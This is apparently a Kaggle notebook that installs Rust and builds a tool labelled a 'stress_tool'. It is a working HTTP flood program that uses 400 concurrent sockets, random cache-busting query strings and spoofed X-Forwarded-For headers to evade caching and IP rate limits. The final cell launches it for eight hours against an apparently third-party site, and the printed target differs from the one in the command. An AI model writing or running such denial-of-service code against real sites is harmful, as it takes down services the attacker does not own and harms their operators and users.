In [1]:
!apt install nano




Suggested packages:
  hunspell
The following NEW packages will be installed:
  nano
0 upgraded, 1 newly installed, 0 to remove and 50 not upgraded.
Need to get 690 kB of archives.
After this operation, 2871 kB of additional disk space will be used.
Get:1 http://deb.debian.org/debian bookworm/main amd64 nano amd64 7.2-1+deb12u1 [690 kB]
Fetched 690 kB in 0s (15.1 MB/s)
debconf: delaying package configuration, since apt-utils is not installed

78Selecting previously unselected package nano.
(Reading database ... 33321 files and directories currently installed.)
Preparing to unpack .../nano_7.2-1+deb12u1_amd64.deb ...
7Progress: [  0%] [..........................................................] 87Progress: [ 20%] [###########...............................................] 8Unpacking nano (7.2-1+deb12u1) ...
7Progress: [ 40%] [#######################...................................] 8Setting up nano (7.2-1+deb12u1) ...
7Progress: [ 60%] [##################################.

In [2]:
!curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
import os
os.environ['PATH'] += ":/root/.cargo/bin"

info: downloading installer
info: profile set to default
info: default host tuple is x86_64-unknown-linux-gnu
info: syncing channel updates for stable-x86_64-unknown-linux-gnu
info: latest update on 2026-08-20 for version 1.98.0 (88d9e12ae 2026-08-18)
info: downloading 6 components
        rustc installed                       76.05 MiB                               rustfmt installed                        2.37 MiB                         info: default toolchain set to stable-x86_64-unknown-linux-gnu

  stable-x86_64-unknown-linux-gnu installed - rustc 1.98.0 (88d9e12ae 2026-08-18)


Rust is installed now. Great!

To get started you may need to restart your current shell.
This would reload your PATH environment variable to include
Cargo's bin directory ($HOME/.cargo/bin).

To configure your current shell, you need to source the
corresponding env file under $HOME/.cargo.

Consider running the right command for your shell (note the leading DOT):
. "$HOME/.cargo/env" # For sh/ash/dash/pdk

In [3]:
!cargo new stress_tool
%cd stress_tool

    Creating binary (application) `stress_tool` package
note: see more `Cargo.toml` keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
/root/stress_tool


In [4]:
with open("Cargo.toml", "a") as f:
    f.write('tokio = { version = "1", features = ["full"] }\n')
    f.write('reqwest = { version = "0.11", default-features = false, features = ["json", "rustls-tls"] }\n')
    f.write('rand = "0.8"\n')

In [5]:
!rm src/main.rs

In [6]:
%%writefile src/main.rs
use reqwest::Client;
use std::sync::Arc;
use tokio::time::{Duration, Instant};
use std::env;
use rand::Rng;

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 4 {
        println!("Usage: ./stress_tool <URL> <Duration_Secs> <Parallel_Sockets>");
        println!("Example: ./stress_tool https://namansoni.in 10 200");
        return;
    }

    let target_url = Arc::new(args[1].clone());
    let duration = Duration::from_secs(args[2].parse().unwrap());
    let parallel_sockets: usize = args[3].parse().unwrap();

    let client = Arc::new(Client::builder().build().unwrap());

    println!("🔥 CACHE-BYPASS MODE ENABLED");
    println!("🚀 Target: {}", target_url);
    println!("🕒 Duration: {}s | ⚡ Sockets: {}", duration.as_secs(), parallel_sockets);

    let start_time = Instant::now();
    let mut handles = vec![];

    for _ in 0..parallel_sockets {
        let client_ptr = Arc::clone(&client);
        let url_ptr = Arc::clone(&target_url);
        
        let handle = tokio::spawn(async move {
            let mut request_count = 0;

            while Instant::now() - start_time < duration {
                let (fake_ip, cache_buster) = {
                    let mut rng = rand::thread_rng();
                    let ip = format!("{}.{}.{}.{}", 
                        rng.gen_range(1..255), rng.gen_range(1..255), 
                        rng.gen_range(1..255), rng.gen_range(1..255)
                    );
                    let buster: u32 = rng.gen_range(1..9999999);
                    (ip, buster)
                };

                let aggressive_url = if url_ptr.contains('?') {
                    format!("{}&cb={}", *url_ptr, cache_buster)
                } else {
                    format!("{}?cb={}", *url_ptr, cache_buster)
                };

                let _ = client_ptr.get(&aggressive_url)
                    .header("X-Forwarded-For", fake_ip)
                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .send()
                    .await;

                request_count += 1;
            }
            request_count
        });
        handles.push(handle);
    }

    let mut total_requests = 0;
    for handle in handles {
        total_requests += handle.await.unwrap_or(0);
    }

    println!("\n✅ TEST COMPLETE");
    println!("📊 Total Unique Requests: {}", total_requests);
    println!("📈 Average RPS: {}", total_requests / duration.as_secs() as u64);
}

Writing src/main.rs


In [7]:
!cargo build --release

    Updating crates.io index
     Locking 145 packages to latest Rust 1.98.0 compatible versions
      Adding rand v0.8.8 (available: v0.10.2)
      Adding reqwest v0.11.27 (available: v0.13.4)
  Downloaded cfg-if v1.0.4
  Downloaded displaydoc v0.2.7
  Downloaded bytes v1.12.1
  Downloaded base64 v0.21.7
  Downloaded cc v1.4.4
  Downloaded zmij v1.0.23
  Downloaded ipnet v2.12.1
  Downloaded mime v0.3.17
  Downloaded zerovec-derive v0.11.6
  Downloaded zerotrie v0.2.5
  Downloaded potential_utf v0.1.6
  Downloaded stable_deref_trait v1.2.1
  Downloaded tokio-macros v2.7.2
  Downloaded futures-core v0.3.34
  Downloaded futures-task v0.3.34
  Downloaded percent-encoding v2.3.2
  Downloaded itoa v1.0.18
  Downloaded idna_adapter v1.2.2
  Downloaded want v0.3.1
  Downloaded zerofrom v0.1.8
  Downloaded tower-service v0.3.3
  Downloaded untrusted v0.9.0
  Downloaded try-lock v0.2.5
  Downloaded zerofrom-derive v0.1.7
  Downloaded http-body v0.4.6
  Downloaded scopeguard v1.2.0
  Downloaded

In [ ]:
# In a Kaggle cell
!./target/release/stress_tool https://freeaixyz4all.vercel.app/models 28800 400

🔥 CACHE-BYPASS MODE ENABLED
🚀 Target: https://jankrouter.waifly.com/
🕒 Duration: 28800s | ⚡ Sockets: 400
